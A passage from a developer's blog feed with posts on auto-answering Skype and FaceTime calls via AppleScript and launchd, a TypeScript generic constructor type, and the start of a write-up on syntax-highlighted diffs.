&lt;p&gt;So, while Skype is running we try to select the incoming video call window. Of course, this window will only exist when we have a call to answer, so we check that it exists. After that, we grab the caller ID from the text element and check if it matches who we want. Then we click answer. It actually took me a few tried to figure out which index was the answer with video button as it doesn&amp;#39;t follow visual order.&lt;/p&gt;
&lt;p&gt;Before we export, change the caller ID. Then, go to &lt;code&gt;File -&amp;gt; Export&lt;/code&gt; and save it somewhere you&amp;#39;ll remember. I exported mine to &lt;code&gt;Documents/Scripts/skype-auto-answer&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Next step, let&amp;#39;s navigate to &lt;code&gt;cd ~/Library/LaunchAgents&lt;/code&gt; in the Terminal and create our file using &lt;code&gt;vi com.blakeembrey.skype-auto-answer.plist&lt;/code&gt;. In vim, you&amp;#39;ll need to press &lt;code&gt;i&lt;/code&gt; to go into &amp;quot;insert&amp;quot; mode. Copy and paste the code below, but remember to change the script location to where you just exported to.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-xml&quot;&gt;&lt;span class=&quot;hljs-pi&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-doctype&quot;&gt;&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;plist&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;version&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;dict&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;Label&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;com.blakeembrey.skype-auto-answer&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;Program&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;/usr/bin/osascript&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;ProgramArguments&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;array&lt;/span&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;osascript&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;/Users/blakeembrey/Documents/Scripts/skype-auto-answer.scpt&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;array&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;RunAtLoad&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;true&lt;/span&gt;/&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;KeepAlive&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;true&lt;/span&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;dict&lt;/span&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;plist&lt;/span&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And we&amp;#39;re almost done. Let&amp;#39;s exit vim (&lt;code&gt;Esc&lt;/code&gt;, &lt;code&gt;:wq&lt;/code&gt;, &lt;code&gt;Enter&lt;/code&gt;) and get Launchd to pick up our changes.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;launchctl load -w com.blakeembrey.skype-auto-answer.plist
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tada! You might need to accept the accessibility dialog that pops up, but the script will now be running. You can verify this by executing &lt;code&gt;launchctl list | grep skype-auto-answer&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Done!&lt;/p&gt;
&lt;p&gt;P.S. If you ever want to unload the script, just execute &lt;code&gt;launchctl unload -w com.blakeembrey.skype-auto-answer.plist&lt;/code&gt;, same as you did to load.&lt;/p&gt;
</description></item><item><title>FaceTime Auto Answer</title><link>http://blakeembrey.com/articles/2015/06/facetime-auto-answer-applescript</link><pubDate>Sat, 20 Jun 2015 02:00:00 +1000</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2015/06/facetime-auto-answer-applescript</guid><author>Blake Embrey</author><description>&lt;p&gt;Some pretext...&lt;/p&gt;
&lt;p&gt;I talk with my girlfriend every day. Sometimes multiple times a day. Unfortunately, we&amp;#39;re in a long distance relationship and, at times, completely different time zones. One habit we wanted to pick up was being able to see each other at any time.&lt;/p&gt;
&lt;p&gt;For this to work, we need to be able to auto answer each others calls. One of us could be asleep or busy working, but we still want to be able to see each other. After days of exploring how to make this happen, I come up with some solutions.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create new Skype accounts just for each other and enable auto answer on those accounts.&lt;/li&gt;
&lt;li&gt;Keep a Google Hangouts room alive that we can both join at any time.&lt;/li&gt;
&lt;li&gt;Create our own video chat platform using WebRTC that will fulfil our needs.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Being the nerd I am, the third option sounded the most fun! From all my research, however, I was amazed no one had implemented a feature so simple into their product. Each of these options have their own drawbacks.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;I need to sign in and out between accounts (an issue for us since we work and live on our computers).&lt;/li&gt;
&lt;li&gt;Google Hangouts prompts after inactivity and kicks the user from the chat.&lt;/li&gt;
&lt;li&gt;Time.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Eventually, I stumbled upon the magic bullet - FaceTime has an option built in to auto answer (&lt;code&gt;defaults write com.apple.FaceTime AutoAcceptInvitesFrom -array-add hello@blakeembrey.com&lt;/code&gt;). It &amp;quot;works&amp;quot;, but it comes with even more issues. For example, when you receive a call there is a black overlay over the video call which makes visibility difficult. On a second test, we also discovered that it&amp;#39;ll ring infinitely. Well, so much for that.&lt;/p&gt;
&lt;p&gt;At this point, we gave up and Keyue needed to sleep. I decided to continue research the following day when she was at work (my night time) and discovered some people had written an AppleScript for this years ago. I stayed up until 4am trying to create a new AppleScript, hacking away in a forgiving syntax I had no idea how to use without the constant use of Google.&lt;/p&gt;
&lt;h2 id=&quot;implementation&quot;&gt;Implementation&lt;/h2&gt;
&lt;p&gt;Let&amp;#39;s start by opening the &amp;quot;Script Editor&amp;quot; application. Copy and paste the following code into the editor, changing the caller id check to your desired caller. This the caller that is shown next to the profile image and accept button during ringing. For me, Keyue Bao is a contact so I can use her name. If they aren&amp;#39;t a contact, you&amp;#39;ll need to type the specific email or phone number here.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-applescript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt; contacts &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; {&lt;span class=&quot;hljs-string&quot;&gt;&quot;Keyue Bao&quot;&lt;/span&gt;}

&lt;span class=&quot;hljs-keyword&quot;&gt;repeat&lt;/span&gt;
  &lt;span class=&quot;hljs-keyword&quot;&gt;repeat&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;application&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;FaceTime&quot;&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;hljs-property&quot;&gt;running&lt;/span&gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;tell&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;application&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;System Events&quot;&lt;/span&gt;
      &lt;span class=&quot;hljs-keyword&quot;&gt;tell&lt;/span&gt; process &lt;span class=&quot;hljs-string&quot;&gt;&quot;FaceTime&quot;&lt;/span&gt;
        &lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt; acceptButton &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;a reference&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; (button &lt;span class=&quot;hljs-string&quot;&gt;&quot;Accept&quot;&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; window &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;)

        &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; acceptButton exists &lt;span class=&quot;hljs-keyword&quot;&gt;then&lt;/span&gt;
          &lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt; callerId &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; value &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; static &lt;span class=&quot;hljs-type&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; window &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;

          &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; contacts &lt;span class=&quot;hljs-keyword&quot;&gt;contains&lt;/span&gt; callerId &lt;span class=&quot;hljs-keyword&quot;&gt;then&lt;/span&gt;
            click acceptButton
          &lt;span class=&quot;hljs-keyword&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;
        &lt;span class=&quot;hljs-keyword&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;
      &lt;span class=&quot;hljs-keyword&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;tell&lt;/span&gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;tell&lt;/span&gt;
    &lt;span class=&quot;hljs-command&quot;&gt;delay&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;
  &lt;span class=&quot;hljs-keyword&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;repeat&lt;/span&gt;
  &lt;span class=&quot;hljs-command&quot;&gt;delay&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;repeat&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The script runs on an infinite loop. There is a delay of 5 seconds when the application is closed and 2 seconds when the application is open. It attempts to select the &amp;quot;answer&amp;quot; button on the screen and, if it exists, it checks the caller id and clicks answer. Pretty simple.&lt;/p&gt;
&lt;p&gt;Next we want to export the script for execution. Navigate to &lt;code&gt;File -&amp;gt; Export&lt;/code&gt; and save it somewhere you can remember it. For me, it was as &lt;code&gt;Documents/Scripts/facetime-auto-answer&lt;/code&gt;. You need this path for the next step.&lt;/p&gt;
&lt;p&gt;Let&amp;#39;s create a Launchd script to handle execution on computer start up. Navigate to &lt;code&gt;~/Library/LaunchAgents&lt;/code&gt; using Terminal (open Terminal and enter &lt;code&gt;cd ~/Library/LaunchAgents&lt;/code&gt;). After that, that&amp;#39;s add our file (below) as &lt;code&gt;com.blakeembrey.facetime-auto-answer.plist&lt;/code&gt; (just &lt;code&gt;vi com.blakeembrey.facetime-auto-answer.plist&lt;/code&gt; and hit &lt;code&gt;i&lt;/code&gt; to switch to insert mode).&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-xml&quot;&gt;&lt;span class=&quot;hljs-pi&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-doctype&quot;&gt;&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;plist&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;version&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;dict&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;Label&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;com.blakeembrey.FaceTimeAutoAnswer&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;Program&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;/usr/bin/osascript&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;ProgramArguments&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;array&lt;/span&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;osascript&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;/Users/blakeembrey/Scripts/facetime-auto-answer.scpt&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;array&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;RunAtLoad&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;true&lt;/span&gt;/&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;KeepAlive&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;true&lt;/span&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;dict&lt;/span&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;plist&lt;/span&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Make sure you adjust the argument above to the correct path from the export step. Once it&amp;#39;s correct, exit back to the terminal (&lt;code&gt;Esc&lt;/code&gt;, &lt;code&gt;:wq&lt;/code&gt;, &lt;code&gt;Enter&lt;/code&gt;) and make Launchd pick up the new script without rebooting.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;launchctl load -w com.blakeembrey.facetime-auto-answer.plist
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You&amp;#39;ll need to accept the accessibility dialog (open system preferences and enable access). We can quickly check that the script is running by entering &lt;code&gt;launchctl list | grep facetime-auto-answer&lt;/code&gt;. And we&amp;#39;re done.&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;FaceTime is really nice for video chatting. It disables automatically when you&amp;#39;re in a different window (I regularly use up to 6 windows during a work day for different tasks) and the interface is very simple to use. The video quality is great and, when the call drops temporarily it will automatically join the call again (with the video still enabled - looking at you Skype). On top of that, it has a low CPU footprint, especially compared with Skype.&lt;/p&gt;
&lt;p&gt;However, there&amp;#39;s a couple of major issues with it. First off, it makes the rest of the computer quieter which makes it difficult to work or anything else while on the call. For example, we can&amp;#39;t really watch a movie together either. The second is a feature request. I would love the &amp;quot;floating&amp;quot; window feature from Skype.&lt;/p&gt;
&lt;p&gt;And we&amp;#39;re done. I&amp;#39;m going to tweak the same script to auto answer Skype next. Hopefully this comes built in with future versions of video chat clients. It&amp;#39;s such a basic feature that it&amp;#39;s exclusion makes me ponder the disconnect between the teams creating the software and reality.&lt;/p&gt;
</description></item><item><title>Reference the Constructor of a Type in TypeScript (Generically)</title><link>http://blakeembrey.com/articles/2015/04/typescript-constructor-of-type</link><pubDate>Tue, 28 Apr 2015 00:00:00 +1000</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2015/04/typescript-constructor-of-type</guid><author>Blake Embrey</author><description>&lt;p&gt;Although not initially intuitive, I run into this issue while documenting the &lt;a href=&quot;http://martyjs.org/api/registry/index.html#register&quot;&gt;&lt;code&gt;register&lt;/code&gt;&lt;/a&gt; function in Marty.js. I didn&amp;#39;t realise a solution, so I reached out to a friend who provided me with this beauty.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-ts&quot;&gt;function register&amp;lt;T&amp;gt;(clazz: { new (...args: any[]): T }): T;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And it works brilliantly! But what&amp;#39;s this even doing? I&amp;#39;ve just created a generic function that accepts a constructor function of any type and returns that type. No need to do type coercion. It turned out perfectly for this situation, where I can register a &lt;code&gt;Store&lt;/code&gt;, &lt;code&gt;Queries&lt;/code&gt;, &lt;code&gt;ActionCreators&lt;/code&gt; and more!&lt;/p&gt;
&lt;p&gt;You can also write this with a slightly different syntax such as &lt;code&gt;new (...args: any[]) =&amp;gt; T&lt;/code&gt;. There&amp;#39;s no real difference here.&lt;/p&gt;
&lt;p&gt;Although it doesn&amp;#39;t apply here, we can also look how we might accept more specific types of constructors.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-ts&quot;&gt;// Using `typeof`...

class X {
  method (): void {}
}

function create (C: typeof X) {
  return new C()
}

create(X)

// Using an inline parameter...

interface Y {
  method(): void
}

function create2 (C: new (...args: any[]) =&amp;gt; Y) {
  return new C()
}

class Z implements Y {
  method(): void {}
}

create2(Z)
&lt;/code&gt;&lt;/pre&gt;
</description></item><item><title>Syntax Highlighted Diffs For Everyone</title><link>http://blakeembrey.com/articles/2014/12/syntax-highlighting-blog-diff-support</link><pubDate>Fri, 26 Dec 2014 00:30:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2014/12/syntax-highlighting-blog-diff-support</guid><author>Blake Embrey</author><description>&lt;p&gt;This is a recount, of sorts, on how I added syntax highlighting to diffs on my blog and turned it into a module for anyone to use. The module is made for syntax highlighting Markdown files straight out of the box (supporting &lt;a href=&quot;https://github.com/chjj/marked&quot;&gt;marked&lt;/a&gt; style highlight callbacks). Check out GitHub and npm for the final result.&lt;/p&gt;
&lt;p&gt;Two weeks ago, &lt;a href=&quot;https://github.com/blog/1932-syntax-highlighted-diffs&quot;&gt;GitHub announced&lt;/a&gt; a new feature - syntax highlighting of diffs. A couple of months earlier, I wrote a detailed &lt;a href=&quot;/articles/2014/09/building-a-blog-with-metalsmith/&quot;&gt;introduction to Metalsmith&lt;/a&gt; where I used diffs to show the readers what changed at each step. Before I published it I discovered that the diff highlighting by &lt;a href=&quot;https://highlightjs.org/&quot;&gt;Highlight.js&lt;/a&gt; left the addition and deletion marks inline, which degraded the reading experience. Determined to push live, I forged through and &lt;a href=&quot;https://github.com/blakeembrey/blakeembrey.com/commit/206bbb0e047bfe24f92d25d847986ebed6548e06#diff-15ac5cd3ab657e091ee4aa5456e97ddeR68&quot;&gt;manually highlighted each line&lt;/a&gt; myself.&lt;/p&gt;
&lt;p&gt;Fixing that monstrosity sat on my backlog for months. Finally, I gathered enough time and mental bandwidth to go back and figure out a better solution. It took three complete rewrites over the course of a conference (and then some) to come up with the current solution. This article is more about the thought process over the week than it is about implementing this yourself. That part should be easy for you, just install from npm.&lt;/p&gt;
&lt;h2 id=&quot;first-attempt&quot;&gt;First Attempt&lt;/h2&gt;
&lt;p&gt;The first attempt was simple. I googled around and discovered very little information on the topic, so I implemented the only way I saw mentioned. I syntax highlighted the code first, then I run over the generated markup and matched for diff-like syntax (&lt;a href=&quot;https://github.com/blakeembrey/blakeembrey.com/blob/dfcedefc853cc01ba33539c9b9b2576b1c23aceb/config/markdown.js&quot;&gt;code here&lt;/a&gt;) and wrap those lines in &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt;s based on the type of change.&lt;/p&gt;
&lt;p&gt;I knew it wouldn&amp;#39;t work everywhere, but it allowed me to refactor the original article and remove all the horrible markup. Plus it was simple, I was done within the hour. I opted to use the existing language tag in Markdown to indicate that it was also a diff, since I couldn&amp;#39;t come up with a cleaner solution (E.g. &lt;code&gt;&amp;lt;language&amp;gt;.diff&lt;/code&gt;). But I still wanted a something smarter, something that would work everywhere. This solution had faults when the diff markup messed with the syntax highlighting. So I continued.&lt;/p&gt;
&lt;h2 id=&quot;second-attempt&quot;&gt;Second Attempt&lt;/h2&gt;
&lt;p&gt;The next attempt was more complex. I figured I could match each line type (addition/deletion/metadata/null) and group them together. Then, I would highlight the addition and deletions separately (with null changes filling the spaces). With the two syntax highlighting results, I could go over the code line by line and pick from either the addition or deletion result based on the line type. However, &lt;a href=&quot;https://github.com/blakeembrey/blakeembrey.com/blob/1d0a377e9cdea332045bb6f6074fe29848920746/config/markdown.js&quot;&gt;this code&lt;/a&gt; was brittle. What if a &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt; ran over multiple lines?&lt;/p&gt;
&lt;h3 id=&quot;attempt-2-5&quot;&gt;Attempt 2.5&lt;/h3&gt;
&lt;p&gt;I kept at this solution for a while longer and I added a regex to match open and closing &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt;s. Then, I pushed each open &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt; onto an array and popped it off with each closing &lt;code&gt;&amp;lt;/span&amp;gt;&lt;/code&gt;. If there were any left in each section, I&amp;#39;d close them with a &lt;code&gt;&amp;lt;/span&amp;gt;&lt;/code&gt; and open them again in the next section. This was brilliant and clever, I thought, and I needed to publish it. In fact, it wasn&amp;#39;t until I was refactoring this into a module that I realised what a deep grave I was digging myself.&lt;/p&gt;
&lt;h2 id=&quot;final-attempt&quot;&gt;Final Attempt&lt;/h2&gt;
&lt;p&gt;My third and final attempt started where the last one left off. I knew the grouping was the correct approach, but the highlighter needed a better approach. I recalled that I was only using the &lt;code&gt;value&lt;/code&gt; property of the returned syntax highlighting object, so I thought it was about time to read some documentation. Lo and behold, I discovered the &lt;a href=&quot;http://highlightjs.readthedocs.org/en/latest/api.html#highlight-name-value-ignore-illegals-continuation&quot;&gt;third and fourth arguments&lt;/a&gt; of Highlight.js.&lt;/p&gt;
&lt;p&gt;The third argument was interesting, I could try to ignore illegal characters in the code. I though this might work when the syntax highlighter started in an invalid position. The holy grail, however, was the fourth argument. It would accept a continuation stack, which meant I could probably leave the syntax highlighting incomplete and start it again later. I hoped that this would also close the &lt;code&gt;&amp;lt;/span&amp;gt;&lt;/code&gt;s for me, and it did!&lt;/p&gt;
&lt;p&gt;I used the previous grouping solution and iterated over each group keeping track of the previously highlighted stack (both addition or deletion). It worked out perfectly and I wrapped each highlighted group in a &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt; with its diff type as the class (E.g. &lt;code&gt;&amp;lt;span class=&amp;quot;diff-addition&amp;quot;&amp;gt;&lt;/code&gt;). I attempted to use the &lt;code&gt;ignore_illegals&lt;/code&gt; argument, but it failed in a JSON example (starting at a property of an object) so I had to disable it again.&lt;/p&gt;
&lt;p&gt;The &lt;a href=&quot;https://github.com/blakeembrey/highlighter&quot;&gt;result of my labour&lt;/a&gt; can be viewed below. Diff syntax highlighting in all its glory - the exact same block of code GitHub uses in &lt;a href=&quot;https://github.com/blog/1932-syntax-highlighted-diffs&quot;&gt;their example&lt;/a&gt;!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-cs.diff&quot;&gt;&lt;span class=&quot;diff-chunk&quot;&gt;@@ -164,29 +164,34 @@&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;        [Fact]
